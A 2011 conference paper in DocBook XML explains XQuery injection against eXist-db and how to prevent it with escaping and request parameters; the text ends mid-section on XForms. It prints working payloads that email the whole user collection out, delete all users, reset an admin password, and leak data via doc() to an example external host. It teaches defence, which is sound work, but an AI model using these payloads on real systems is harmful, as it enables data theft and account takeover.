<?xml version="1.0" encoding="UTF-8" standalone="no"?><classedDocument><article xmlns="http://docbook.org/ns/docbook" xmlns:xlink="http://www.w3.org/1999/xlink" class="po-hcontainer e0 e0" version="5.0-subset Balisage-1.3"><title class="po-block e1 e1"><textual class="po-textual">XQuery Injection</textual></title><subtitle class="po-block e2 e2"><textual class="po-textual">Easy to exploit, easy to prevent...</textual></subtitle><info class="po-record e3 e3"><confgroup class="po-record e4 e4"><conftitle class="po-field e5 e5"><textual class="po-textual">Balisage: The Markup Conference 2011</textual></conftitle><confdates class="po-field e6 e6"><textual class="po-textual">August 2 - 5, 2011</textual></confdates></confgroup><abstract class="po-container e7 e7"><para class="po-block e8 e8"><textual class="po-textual">We all know (and worry) about SQL injection, but should we also worry about XQuery injection?</textual></para><para class="po-block e9 e9"><textual class="po-textual">With the power of extension functions and the implementation of XQuery update features, the answer is clearly yes! We will see how an attacker can send information to an external site or
        erase a collection through XQuery injection on a naive and unprotected application using the eXist-db REST API.</textual></para><para class="po-block e10 e10"><textual class="po-textual">That's the bad news...</textual></para><para class="po-block e11 e11"><textual class="po-textual">The good news is that it's quite easy to protect your application from XQuery injection after this word of warning. We'll discuss a number of simple techniques (literal string escaping,
        wrapping values into elements or moving them out of queries in HTTP parameters) and see how to implement them in different environments covering traditional programming languages, XSLT, XForms
        and pipeline languages.</textual></para></abstract><author class="po-record e12 e12"><personname class="po-record e13 e13"><firstname class="po-field e14 e14"><textual class="po-textual">Eric</textual></firstname><surname class="po-field e15 e15"><textual class="po-textual">van der Vlist</textual></surname></personname><personblurb class="po-container e16 e16"><para class="po-block e17 e17"><textual class="po-textual">Eric is an independent consultant and trainer. His domain of expertise includes Web development and XML technologies.</textual></para><para class="po-block e18 e18"><textual class="po-textual">He is the creator and main editor of </textual><link class="po-inline e19 e19" xlink:actuate="onRequest" xlink:href="http://xmlfr.org" xlink:show="new" xlink:type="simple"><textual class="po-textual">XMLfr.org</textual></link><textual class="po-textual">, the main site dedicated to XML technologies in French, the author of the O'Reilly animal books XML
          Schema and RELAX NG and a member or the ISO DSDL (</textual><link class="po-inline e20 e20" xlink:actuate="onRequest" xlink:href="http://dsdl.org" xlink:show="new" xlink:type="simple"><textual class="po-textual">http://dsdl.org</textual></link><textual class="po-textual">) working group focused on XML schema languages.</textual></para><para class="po-block e21 e21"><textual class="po-textual">He is based in Paris and you can reach him by mail (</textual><link class="po-inline e22 e22" xlink:actuate="onRequest" xlink:href="mailto:vdv@dyomedea.com" xlink:show="new" xlink:type="simple"><textual class="po-textual">vdv@dyomedea.com</textual></link><textual class="po-textual">) or meet him at one of the many conferences where he presents his
          projects.</textual></para></personblurb><affiliation class="po-record e23 e23"><orgname class="po-block e24 e24"><textual class="po-textual">Dyomedea</textual></orgname></affiliation></author><legalnotice class="po-container e25 e25"><para class="po-block e26 e26"><textual class="po-textual">Copyright Â© 2011 by the author. Used with permission.</textual></para></legalnotice></info><note class="po-container e27 e27"><para class="po-block e28 e28"><textual class="po-textual">I am not a security expert and, as far as I know, the domain covered by this paper is very new. The list of attacks and counter attacks mentioned hereafter is nothing more than the list of
      attacks and counter attacks I can think of. This list is certainly </textual><emphasis class="po-inline e29 e29"><textual class="po-textual">not</textual></emphasis><textual class="po-textual"> exhaustive and following its advise is by no means a guarantee that you'll be safe! If you see (or
      think of) other attacks or solutions, drop me an </textual><link class="po-inline e30 e30" xlink:actuate="onRequest" xlink:href="mailto:vdv@dyomedea.com" xlink:show="new" xlink:type="simple"><textual class="po-textual">email</textual></link><textual class="po-textual"> so that I may improve the next versions of this document.</textual></para></note><para class="po-block e31 e31"><textual class="po-textual">Many thanks to Alessandro Vernet (Orbeon) for the time he has spent discussing these issues with me and for suggesting to rely on query string parameters and to Adam Retter (eXist-db
    developer) for his thorough review of this paper!</textual></para><section class="po-hcontainer e32 e32"><title class="po-block e33 e33"><textual class="po-textual">Code Injection</textual></title><para class="po-block e34 e34"><textual class="po-textual">Wikipedia defines code injection as:</textual></para><para class="po-block e35 e35"><citation class="po-atom e36 e36"><textual class="po-textual">the exploitation of a computer bug that is caused by processing invalid data. Code injection can be used by an attacker to introduce (or "inject") code into a computer program to
        change the course of execution. The results of a code injection attack can be disastrous. For instance, code injection is used by some computer worms to propagate.</textual></citation></para><para class="po-block e37 e37"><link class="po-inline e38 e38" xlink:actuate="onRequest" xlink:href="http://en.wikipedia.org/wiki/SQL_injection" xlink:show="new" xlink:type="simple"><textual class="po-textual">SQL injection</textual></link><textual class="po-textual"> is arguably the most common example of code injection since it can potentially affect any web application or
      website accessing a SQL database including all the widespread </textual><link class="po-inline e39 e39" xlink:actuate="onRequest" xlink:href="http://en.wikipedia.org/wiki/AMP_%28solution_stack%29" xlink:show="new" xlink:type="simple"><textual class="po-textual">AMP</textual></link><textual class="po-textual"> systems.</textual></para><para class="po-block e40 e40"><textual class="po-textual">The second well known example of code injection is </textual><link class="po-inline e41 e41" xlink:actuate="onRequest" xlink:href="http://en.wikipedia.org/wiki/Cross-site_scripting" xlink:show="new" xlink:type="simple"><textual class="po-textual">Cross Site Scripting</textual></link><textual class="po-textual"> (XSS) which could be called "HTML and
      JavaScript injection".</textual></para><para class="po-block e42 e42"><textual class="po-textual">According to the </textual><link class="po-inline e43 e43" xlink:actuate="onRequest" xlink:href="http://projects.webappsec.org/w/page/13246995/Web-Hacking-Incident-Database" xlink:show="new" xlink:type="simple"><textual class="po-textual">Web Hacking Incident Database</textual></link><textual class="po-textual">, SQL injection is the number one attack
      method involved in 20% of the web attacks and Cross Site Scripting is number two with 13% suggesting that code injection techniques are involved in more than 1 out of 3 attacks on the web. </textual></para><para class="po-block e44 e44"><textual class="po-textual">If it's difficult to find any mention of XQuery injection on the web, it's probably because so few websites are powered by XML databases but also because of the false assumption that XQuery
      is a read only language and that its expression power is limited, meaning that the consequences of XQuery injection attacks would remain limited. </textual></para><para class="po-block e45 e45"><textual class="po-textual">This assumption must be revised now that XML databases have started implementing </textual><link class="po-inline e46 e46" xlink:actuate="onRequest" xlink:href="http://www.w3.org/TR/xquery-update-10/" xlink:show="new" xlink:type="simple"><textual class="po-textual">XQuery Update Facilities</textual></link><textual class="po-textual"> and that XQuery
      engines (either databases, libraries such as Saxon or middleware such as BEA Weblogic) have extensive extension function libraries which let them communicate with the external world!
      Furthermore, when you think about it, even the good old XSLT 1.0 </textual><code class="po-atom e47 e47"><textual class="po-textual">document()</textual></code><textual class="po-textual"> function or its XPath 2.0/XQuery 1.0 </textual><code class="po-atom e48 e48"><textual class="po-textual">doc()</textual></code><textual class="po-textual"> friend are potential risks. </textual></para></section><section class="po-hcontainer e49 e49"><title class="po-block e50 e50"><textual class="po-textual">Example of XQuery Injection</textual></title><section class="po-hcontainer e51 e51"><title class="po-block e52 e52"><textual class="po-textual">Scenario</textual></title><para class="po-block e53 e53"><textual class="po-textual">If you develop an application that requires user interaction, you will probably need sooner or later some kind of user authentication, and if your application is powered by an XML
        database, you may want to store user information in this database.</textual></para><note class="po-container e54 e54"><para class="po-block e55 e55"><textual class="po-textual">There are two ways to rely on a database for user authentication: you can either store user and password information in the database (like any other information) or rely on the database
          internal security mechanism. The authentication method used in this example just stores user and password information in the database.</textual></para></note><para class="po-block e56 e56"><textual class="po-textual">In the Java world, Tomcat comes with a number of so called authentication "</textual><link class="po-inline e57 e57" xlink:actuate="onRequest" xlink:href="http://tomcat.apache.org/tomcat-6.0-doc/realm-howto.html" xlink:show="new" xlink:type="simple"><textual class="po-textual">realms</textual></link><textual class="po-textual">" for plain files, SQL
        databases or LDAP but there is no realm to use an XML database to store authentication information.</textual></para><para class="po-block e58 e58"><textual class="po-textual">That's not really an issue since the realm interface is easy to implement. This interface has been designed so that you can store the passwords either as plain text or encrypted. Of
        course, it's safer (and recommended) to store encrypted passwords, but for the sake of this example, let's say you are lazy and store them as plain text. I'll spare you the details, but the
        real meat in your XML database realm will then be to return the password and roles for a user with a given login name.</textual></para><para class="po-block e59 e59"><textual class="po-textual">If you are using an XML database such as eXist with its REST API, you will end up opening an URL with a Java statement such as:</textual></para><programlisting class="po-block e60 e60" xml:space="preserve"><textual class="po-textual">new URL("http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=//user[mail=%27" + username + "%27]")</textual></programlisting></section><section class="po-hcontainer e61 e61"><title class="po-block e62 e62"><textual class="po-textual">Attack</textual></title><para class="po-block e63 e63"><textual class="po-textual">Let's put on a black hat and try to attack a site powered by an XML database that gives us a login screen such as this one:</textual></para><figure class="po-container e64 e64" xml:id="screenshot_login"><title class="po-block e65 e65"><textual class="po-textual">Login Screen</textual></title><mediaobject class="po-container e66 e66"><imageobject class="po-container e67 e67"><imagedata class="po-meta e68 e68" fileref="../../../vol7/graphics/Vlist02/Vlist02-001.png"><textual class="po-textual">Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao</textual></imagedata></imageobject></mediaobject></figure><para class="po-block e69 e69"><textual class="po-textual">We don't know the precise statement used by the realm to retrieve information or the database structure, but we assume that the authentication injects the content of HTML form somewhere
        into an XQuery as a literal string and hope the injection is done without proper sanitization.</textual></para><para class="po-block e70 e70"><textual class="po-textual">We don't know either if the programmer has used a single or a double quote to isolate the content of the input form, but since that makes only two possibilities, we will just try
        both.</textual></para><para class="po-block e71 e71"><textual class="po-textual">The trick is:</textual></para><orderedlist class="po-table e72 e72"><listitem class="po-container e73 e73"><para class="po-block e74 e74"><textual class="po-textual">to close the literal string with a single or double quote</textual></para></listitem><listitem class="po-container e75 e75"><para class="po-block e76 e76"><textual class="po-textual">to add whatever is needed to avoid to raise an XQuery parsing error</textual></para></listitem><listitem class="po-container e77 e77"><para class="po-block e78 e78"><textual class="po-textual">to add the XQuery statement that will carry the attack</textual></para></listitem><listitem class="po-container e79 e79"><para class="po-block e80 e80"><textual class="po-textual">to add again whatever is needed to avoid to raise a parsing error</textual></para></listitem><listitem class="po-container e81 e81"><para class="po-block e82 e82"><textual class="po-textual">to open again a literal string using the same quote</textual></para></listitem></orderedlist><para class="po-block e83 e83"><textual class="po-textual">Let's take care of the syntactic sugar first.</textual></para><para class="po-block e84 e84"><textual class="po-textual">We'll assume that the XQuery expression is following this generic pattern:</textual></para><programlisting class="po-block e85 e85" xml:space="preserve"><textual class="po-textual">&lt;URL&gt;?_query=&lt;PATH&gt;[&lt;SUBPATH&gt; = ' &lt;entry value&gt; ']</textual></programlisting><para class="po-block e86 e86"><textual class="po-textual">Our entry value can follow this other pattern:</textual></para><programlisting class="po-block e87 e87" xml:space="preserve"><textual class="po-textual">' or &lt;ATTACK&gt; or .='</textual></programlisting><para class="po-block e88 e88"><textual class="po-textual">After injection, the XQuery expression will look like:</textual></para><programlisting class="po-block e89 e89" xml:space="preserve"><textual class="po-textual">&lt;URL&gt;?_query=&lt;PATH&gt;[&lt;SUBPATH&gt; = '' or &lt;ATTACK&gt; or .='']</textual></programlisting><para class="po-block e90 e90"><textual class="po-textual">The inner or expression has 3 alternatives. The first one will likely return false (the &lt;SUBPATH&gt; is meant to be the relative path to the user name and most applications won't tolerate
        empty user names in their databases. The XQuery processor will thus pull the trigger and evaluate the attack statement.</textual></para><para class="po-block e91 e91"><textual class="po-textual">The attack must be an XQuery "</textual><link class="po-inline e92 e92" xlink:actuate="onRequest" xlink:href="http://www.w3.org/TR/xquery/#prod-xquery-Expr" xlink:show="new" xlink:type="simple"><textual class="po-textual">Expr</textual></link><textual class="po-textual">" production. That includes FLOWR expressions, but excludes declarations that belong
        to the prologue. In practice, that means that we can't use declare namespace declarations and that we need to embed an extension functions call into elements that declare their
        namespaces.</textual></para><para class="po-block e93 e93"><textual class="po-textual">What kind of attack can we inject?</textual></para><para class="po-block e94 e94"><textual class="po-textual">The first kind of attacks we can try won't break anything but export information from the database to the external world.</textual></para><para class="po-block e95 e95"><textual class="po-textual">With eXist, this is possible using standard extension modules such as the HTTP client module or the mail module. These modules can be activated or deactivated in the eXist configuration
        file and we can't be sure that the attack will work but if one of them is activated we'll be able to export the user collection...</textual></para><para class="po-block e96 e96"><textual class="po-textual">An attack based on the mail module looks like the following:</textual></para><programlisting class="po-block e97 e97" xml:space="preserve"><textual class="po-textual">&lt;foo xmlns:mail='http://exist-db.org/xquery/mail'&gt;
{
    let $message :=
    &lt;mail xmlns:util='http://exist-db.org/xquery/util'&gt;
        &lt;from&gt;vdv@dyomedea.com&lt;/from&gt;
        &lt;to&gt;vdv@dyomedea.com&lt;/to&gt;
        &lt;subject&gt;eXist collection&lt;/subject&gt;
        &lt;message&gt;
            &lt;text&gt;The collection is :
{util:serialize(/*, ())}
            &lt;/text&gt;
        &lt;/message&gt;
    &lt;/mail&gt;

return mail:send-email($message, 'localhost', ()) 
}
&lt;/foo&gt;</textual></programlisting><para class="po-block e98 e98"><textual class="po-textual">A similar attack could send the content of the collection on pastebin.com using the HTTP client module.</textual></para><para class="po-block e99 e99"><textual class="po-textual">To inject the attack, we concatenate the start container string (</textual><code class="po-atom e100 e100"><textual class="po-textual">' or </textual></code><textual class="po-textual">), the attack itself and the end container string (</textual><code class="po-atom e101 e101"><textual class="po-textual"> or .='</textual></code><textual class="po-textual">), normalize the spaces and paste
        the result into the login entry field.</textual></para><para class="po-block e102 e102"><textual class="po-textual">The login screen will return a login error, but if we've been lucky we will receive a mail with the full content of the collection on which the query has been run.</textual></para><para class="po-block e103 e103"><textual class="po-textual">If nothing happened, we might have used the wrong quote and we can try again replacing the single quotes from our container string by double quotes.</textual></para><para class="po-block e104 e104"><textual class="po-textual">If nothing happens once again, which is the case with the naive REST URL construction used in this example, this might be because the application does not encode the query for URI. In that
        case, we must do it ourselves and encode the string before copying it into the entry field like the XPath 2.0 encode-for-uri() would do.</textual></para><para class="po-block e105 e105"><textual class="po-textual">And then, bingo:</textual></para><figure class="po-container e106 e106" xml:id="screenshot_new_message"><title class="po-block e107 e107"><textual class="po-textual">New message!</textual></title><mediaobject class="po-container e108 e108"><imageobject class="po-container e109 e109"><imagedata class="po-meta e110 e110" fileref="../../../vol7/graphics/Vlist02/Vlist02-002.png"><textual class="po-textual">Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao</textual></imagedata></imageobject></mediaobject></figure><para class="po-block e111 e111"><textual class="po-textual">We have a new message with all the information we need to login:</textual></para><figure class="po-container e112 e112" xml:id="screenshot_mail"><title class="po-block e113 e113"><textual class="po-textual">The mail</textual></title><mediaobject class="po-container e114 e114"><imageobject class="po-container e115 e115"><imagedata class="po-meta e116 e116" fileref="../../../vol7/graphics/Vlist02/Vlist02-003.png"><textual class="po-textual">Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao</textual></imagedata></imageobject></mediaobject></figure><para class="po-block e117 e117"><textual class="po-textual">The second kind of attack we can try uses the same technique deletes information from the database. A very simple and extreme one just erases anything from the collection and leaves empty
        document elements:</textual></para><programlisting class="po-block e118 e118" xml:space="preserve"><textual class="po-textual">for $u in //user return update delete $u/(@*|node()</textual></programlisting><para class="po-block e119 e119"><textual class="po-textual">Note that, in both cases, we have not assumed anything about the database structure!</textual></para><para class="po-block e120 e120"><textual class="po-textual">SQL injection attacks often try to generate errors messages that are displayed within the resulting HTML pages by careless sites and expose information about the database structure but
        that hasn't been necessary so far.</textual></para><para class="po-block e121 e121"><textual class="po-textual">On this authentication form, generating errors would have been hopeless since Tomcat handles this safely and only exposes a "yes/no" answer to user entries and sends error messages to the
        server log but on other forms this could also be an option, leading to a third kind of attacks.</textual></para><para class="po-block e122 e122"><textual class="po-textual">If we know the database structure for any reason (this could be because we've successfully leaked information in error messages, because the application's code is open sourced or because
        you've managed to introspect the database using functions such as </textual><link class="po-inline e123 e123" xlink:actuate="onRequest" xlink:href="http://demo.exist-db.org/exist/functions/xmldb/get-child-collections" xlink:show="new" xlink:type="simple"><textual class="po-textual">xmldb;get-child-collections()</textual></link><textual class="po-textual">), we
        can also update user information with forged authentication data:</textual></para><programlisting class="po-block e124 e124" xml:space="preserve"><textual class="po-textual">    let $u := //user[role='orbeon-admin'][1]
        return (
            update value $u/mail with 'eric@example.com',
            update value $u/password with 'foobar'
        ) </textual></programlisting><para class="po-block e125 e125"><textual class="po-textual">What about the </textual><code class="po-atom e126 e126"><textual class="po-textual">doc()</textual></code><textual class="po-textual"> function?</textual></para><para class="po-block e127 e127"><textual class="po-textual">It can be used to leak information to the external world:</textual></para><programlisting class="po-block e128 e128" xml:space="preserve"><textual class="po-textual">'foo' = doc(concat('http://myserver.example.com/?root=', name(/*[1])))</textual></programlisting></section></section><section class="po-hcontainer e129 e129"><title class="po-block e130 e130"><textual class="po-textual">Protection</textual></title><para class="po-block e131 e131"><textual class="po-textual">Now that we've seen the harm that these attacks can do, what can we do to prevent them?</textual></para><para class="po-block e132 e132"><textual class="po-textual">A first set of recommendations is to limit the consequences of these attacks:</textual></para><orderedlist class="po-table e133 e133"><listitem class="po-container e134 e134"><para class="po-block e135 e135"><textual class="po-textual">Do not store non encrypted passwords.</textual></para></listitem><listitem class="po-container e136 e136"><para class="po-block e137 e137"><textual class="po-textual">Use a user with read only permissions to perform read only queries.</textual></para></listitem><listitem class="po-container e138 e138"><para class="po-block e139 e139"><textual class="po-textual">Do not enable extensions modules unless you really need them.</textual></para></listitem></orderedlist><para class="po-block e140 e140"><textual class="po-textual">If the authentication realm of our example had followed these basic recommendations, our attacks would have had limited consequences:</textual><itemizedlist class="po-table e141 e141"><listitem class="po-container e142 e142"><para class="po-block e143 e143"><textual class="po-textual">If the database user used to query the database has no write access the attacker wouldn't have been able to erase the user information.</textual></para></listitem><listitem class="po-container e144 e144"><para class="po-block e145 e145"><textual class="po-textual">If the extensions modules that allow to send mails, the attacker wouldn't have been able to send a mail.</textual></para></listitem></itemizedlist><textual class="po-textual">These recommendations are always worth to follow. They can be compared to recommending to avoid leaving valuables in a room but there are cases when you need to do so and that
      doesn't mean that you shouldn't put a lock on the room's door!</textual></para><para class="po-block e146 e146"><textual class="po-textual">To block the attacks themselves, we need a way to avoid the values being copied into the XQuery expressions leaking out of the literal strings where they are supposed to be located.</textual></para><section class="po-hcontainer e147 e147"><title class="po-block e148 e148"><textual class="po-textual">Generic How To</textual></title><para class="po-block e149 e149"><textual class="po-textual">The most common way to block these kind of attacks is to "escape" the dangerous characters or "sanitize" user inputs before sending them to the XQuery engine.</textual></para><para class="po-block e150 e150"><textual class="po-textual">In an XQuery string literal, the "dangerous" characters are:</textual></para><orderedlist class="po-table e151 e151"><listitem class="po-container e152 e152"><para class="po-block e153 e153"><textual class="po-textual">The </textual><code class="po-atom e154 e154"><textual class="po-textual">&amp;</textual></code><textual class="po-textual"> that can be used to make references to predefined or digital entities and needs to be replaced by the </textual><code class="po-atom e155 e155"><textual class="po-textual">&amp;amp;</textual></code></para></listitem><listitem class="po-container e156 e156"><para class="po-block e157 e157"><textual class="po-textual">The quote (either simple or double) that you use to delimit the literal that needs to be replaced by </textual><code class="po-atom e158 e158"><textual class="po-textual">&amp;apos;</textual></code><textual class="po-textual"> or </textual><code class="po-atom e159 e159"><textual class="po-textual">&amp;quot;</textual></code><textual class="po-textual">
          </textual></para></listitem></orderedlist><para class="po-block e160 e160"><textual class="po-textual">And that's all! These two replacements are enough to block code injections through string literals.</textual></para><para class="po-block e161 e161"><textual class="po-textual">Of course, you also need to use a function such as encode-for-uri() so that the URL remains valid and to block injections through URL encoding. </textual></para><para class="po-block e162 e162"><textual class="po-textual">The second way to block these attacks is to keep the values that are entered through web forms out of the query itself.</textual></para><para class="po-block e163 e163"><textual class="po-textual">When using eXist, this can be done by encoding these values and sending them as URL query parameters. These parameters can then be retrieved using the </textual><link class="po-inline e164 e164" xlink:actuate="onRequest" xlink:href="http://demo.exist-db.org/exist/functions/request/get-parameter" xlink:show="new" xlink:type="simple"><textual class="po-textual">request:get-parameter()</textual></link><textual class="po-textual"> extension function.</textual></para><para class="po-block e165 e165"><textual class="po-textual">Which of these methods should we use?</textual></para><para class="po-block e166 e166"><textual class="po-textual">There is no general rules and it's rather a matter of taste. That being said...</textual></para><itemizedlist class="po-table e167 e167"><listitem class="po-container e168 e168"><para class="po-block e169 e169"><textual class="po-textual">Sanitizing is more portable: request:get-parameter is an eXist specific function that cannot be used with other databases.</textual></para></listitem><listitem class="po-container e170 e170"><para class="po-block e171 e171"><textual class="po-textual">Parameters may (arguably) be considered cleaner since they separate the inputs from the request. They can also be used to call stored queries.</textual></para></listitem></itemizedlist><note class="po-container e172 e172"><para class="po-block e173 e173"><textual class="po-textual">These techniques are efficient and enough to protect your application as long as you don't open a new breach. This is the case when your XQuery expression dynamically executes something
          against a query engine.</textual></para><para class="po-block e174 e174"><textual class="po-textual">In a highly hypothetical case where the XQuery expression would execute a SQL query, this SQL Query would have to be protected against SQL injection.</textual></para><para class="po-block e175 e175"><textual class="po-textual">A more common case in XQuery land is when you use a *:evaluate() extension function to dynamically execute an XPath or XQuery expression.</textual></para><para class="po-block e176 e176"><textual class="po-textual">In that case (see </textual><xref class="po-milestone e177 e177" linkend="evaluate"><textual class="po-textual">Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao Pippo! Ciao</textual></xref><textual class="po-textual">) the expression needs to be further sanitized!</textual></para></note></section><section class="po-hcontainer e178 e178"><title class="po-block e179 e179"><textual class="po-textual">No Filters, Please!</textual></title><para class="po-block e180 e180"><textual class="po-textual">It is common to see developers filtering values as a protection against SQL Injection and you could also do that as a protection against XQuery injection but in both cases this is often a
        bad idea!</textual></para><para class="po-block e181 e181"><textual class="po-textual">Filtering user input is often a bad idea and whenever you do so you should be doing that for data quality reasons and not for security reasons since the constraints will very likely be
        different.</textual></para><para class="po-block e182 e182"><textual class="po-textual">To protect this application against XQuery injection, we could have filtered out the user input to exclude simple quotes and that would have been effective (assuming we use a simple quote
        to delimit the string literal) but that would have given Tim O'Reilly a new opportunity to rant against dumb applications that do not accept is name as an input!</textual></para><para class="po-block e183 e183"><textual class="po-textual">We've seen that it's as easy to sanitize user input than it would have been to filter it, so please, don't use filters for security!</textual></para></section><section class="po-hcontainer e184 e184"><title class="po-block e185 e185"><textual class="po-textual">Java</textual></title><para class="po-block e186 e186"><textual class="po-textual">Assuming that we use single quotes to delimit XQuery string literals, inputs can be sanitized in Java using this function:</textual></para><programlisting class="po-block e187 e187" xml:space="preserve"><textual class="po-textual">    static String sanitize(String text) {
         return text.replace("&amp;", "&amp;amp;").replace("'", "&amp;apos;");
    }</textual></programlisting><para class="po-block e188 e188"><textual class="po-textual">Each user input must be sanitized separately and the whole query must then be encoded using the </textual><code class="po-atom e189 e189"><textual class="po-textual">URLEncoder.encode()</textual></code><textual class="po-textual"> method. Depending on the context, it may also be a good
        idea to call an additional method such as </textual><code class="po-atom e190 e190"><textual class="po-textual">trim()</textual></code><textual class="po-textual"> to remove leading and trailing space or </textual><code class="po-atom e191 e191"><textual class="po-textual">toLowerCase()</textual></code><textual class="po-textual"> to normalize the value to lower case. In the authentication
        realm, the Java snippet could be:</textual></para><programlisting class="po-block e192 e192" xml:space="preserve"><textual class="po-textual">     String query = URLEncoder.encode("//user[mail='" + sanitize(username.trim().toLowerCase()) + "']", "UTF-8");
     reader.parse(new InputSource(
             new URL("http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=" + query).openStream()));</textual></programlisting><para class="po-block e193 e193"><textual class="po-textual">To use request parameters, the query and each of the parameters need to be encoded separately:</textual></para><programlisting class="po-block e194 e194" xml:space="preserve"><textual class="po-textual">     String query = URLEncoder.encode(
            "declare namespace request='http://exist-db.org/xquery/request';//user[mail=request:get-parameter('mail', 0)]",
            "UTF-8");
     String usernameNormalized = URLEncoder.encode(username.trim().toLowerCase(), "UTF-8");
     reader.parse(new InputSource(
            new URL("http://localhost:8080/orbeon/exist/rest/db/app/users/?mail="+ usernameNormalized + "&amp;_query=" + query).openStream()));</textual></programlisting><para class="po-block e195 e195"><textual class="po-textual">To query is now a fixed string that could be stored in the eXist database or encoded in a static variable.</textual></para></section><section class="po-hcontainer e196 e196"><title class="po-block e197 e197"><textual class="po-textual">XPath 2.0 Environments</textual></title><para class="po-block e198 e198"><textual class="po-textual">In environments that rely on XPath 2.0 such as XSLT 2.0, XProc, XPL,... the same patterns can be used if we replace the Java methods with their XPath 2.0 equivalents. In XSLT 2.0 it is
        possible to define a sanitize function similar to the one we've created in Java but this isn't the case for other host languages and we'll skip this step.</textual></para><para class="po-block e199 e199"><textual class="po-textual">To sanitize user inputs in an XPath 2.0 host language, we need to add a level of escaping because the </textual><code class="po-atom e200 e200"><textual class="po-textual">&amp;</textual></code><textual class="po-textual"> character is not available directly but through the
          </textual><code class="po-atom e201 e201"><textual class="po-textual">&amp;amp;</textual></code><textual class="po-textual"> entity reference. The XQuery query combines simple and double quotes that are not very easy to handle in a </textual><code class="po-atom e202 e202"><textual class="po-textual">select</textual></code><textual class="po-textual"> attribute (even if the escaping rules of
        XPath 2.0 help a lot) and the query pieces can be put into variables for convenience. That being said, the user input can be sanitized using statements such as:</textual></para><programlisting class="po-block e203 e203" xml:space="preserve"><textual class="po-textual">        &lt;xsl:variable name="usernameSanitized"
            select="lower-case(normalize-space(replace(replace($username, '&amp;amp;', '&amp;amp;amp;'), '''', '&amp;amp;apos;')))"/&gt;
        &lt;xsl:variable name="queryStart"&gt;//user[mail='&lt;/xsl:variable&gt;
        &lt;xsl:variable name="queryEnd"&gt;']&lt;/xsl:variable&gt;
        &lt;xsl:variable name="query" select="encode-for-uri(concat($queryStart, $usernameSanitized, $queryEnd))"/&gt;
        &lt;xsl:variable name="userInformation" 
             select="doc(concat('http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=', $query))"/&gt;
</textual></programlisting><para class="po-block e204 e204"><textual class="po-textual">To use request parameters, simply write something such as:</textual></para><programlisting class="po-block e205 e205" xml:space="preserve"><textual class="po-textual">        &lt;xsl:variable name="usernameNormalized" select="lower-case(normalize-space($username))"/&gt;
        &lt;xsl:variable name="query"&gt;
            declare namespace request='http://exist-db.org/xquery/request';
            //user[mail=request:get-parameter('mail',0)]&lt;/xsl:variable&gt;
        &lt;xsl:variable name="userInformation"
            select="doc(concat('http://localhost:8080/orbeon/exist/rest/db/app/users/?mail=', 
                    encode-for-uri($usernameNormalized) , '&amp;amp;_query=', encode-for-uri($query)))"/&gt;
</textual></programlisting><para class="po-block e206 e206"><textual class="po-textual">Here again; the choice to normalize spaces and convert to lower case depends on the context.</textual></para><section class="po-hcontainer e207 e207"><title class="po-block e208 e208"><textual class="po-textual">XSLT 2.0</textual></title><para class="po-block e209 e209"><textual class="po-textual">In XSLT 2.0, functions can be used to implement this technique like those shown in this transformation: </textual></para><programlisting class="po-block e210 e210" xml:space="preserve"><textual class="po-textual">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:san="http://example.com/sanitization/"
    xmlns:xs="http://www.w3.org/2001/XMLSchema" exclude-result-prefixes="xs" version="2.0"&gt;
    
    &lt;xsl:output method="text"/&gt;
    
    &lt;xsl:function name="san:sanitize-apos" as="xs:string"&gt;
        &lt;xsl:param name="text" as="xs:string"/&gt;
        &lt;xsl:sequence select="replace(replace($text, '&amp;amp;', '&amp;amp;amp;'), '''', '&amp;amp;apos;')"/&gt;
    &lt;/xsl:function&gt;
    &lt;xsl:function name="san:sanitize-quot" as="xs:string"&gt;
        &lt;xsl:param name="text" as="xs:string"/&gt;
        &lt;xsl:sequence select='replace(replace($text, "&amp;amp;", "&amp;amp;amp;"), """", "&amp;amp;quot;")'/&gt;
    &lt;/xsl:function&gt;
    
    &lt;xsl:template match="/"&gt;
        &lt;xsl:value-of select="san:sanitize-apos(''' or ( for $u in //user return update delete $u/(@*|node() ) ) or .=''')"/&gt;
    &lt;/xsl:template&gt;
    
&lt;/xsl:stylesheet&gt;</textual></programlisting></section><section class="po-hcontainer e211 e211"><title class="po-block e212 e212"><textual class="po-textual">XQuery</textual></title><para class="po-block e213 e213"><textual class="po-textual">Similar functions can be defined in XQuery:</textual></para><programlisting class="po-block e214 e214" xml:space="preserve"><textual class="po-textual">xquery version "1.0";

declare function local:sanitize-apos($text as xs:string) as xs:string {
        replace(replace($text, '&amp;amp;', '&amp;amp;amp;'), '''', '&amp;amp;apos;')
};

declare function local:sanitize-apos($text as xs:string) as xs:string {
        replace(replace($text, "&amp;amp;", "&amp;amp;amp;"), """", "&amp;amp;quot;")
};


local:sanitize-apos(''' or ( for $u in //user return update delete $u/(@*|node() ) ) or .=''')</textual></programlisting></section></section><section class="po-hcontainer e215 e215"><title class="po-block e216 e216"><textual class="po-textual">XForms</textual></title><para class="po-block e217 e217"><textual class="po-textual">The problem is very similar in XForms with the difference that XForms is meant to deal with user input and that the chances that you'll hit the problem are significantly bigger!</textual></para><para class="po-block e218 e218"><textual class="po-textual">The rule of thumb here again is: never inject a user input in an XQuery without sanitizing it or moving it out of the query using request parameters.</textual></para><para class="po-block e219 e219"><textual class="po-textual">When using an implementation such as Orbeon Forms, that supports attribute value templates in </textual><code class="po-atom e220 e220"><textual class="po-textual">resource</textual></code><textual class="po-textual"> attributes, it may be tempting to write submissions such as:</textual></para><programlisting class="po-block e221 e221" xml:space="preserve"><textual class="po-textual"> &lt;xforms:submission id="doSearch" method="get"
    resource="http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=//user[mail='{instance('search')}']" 
    instance="result" replace="instance"/&gt;
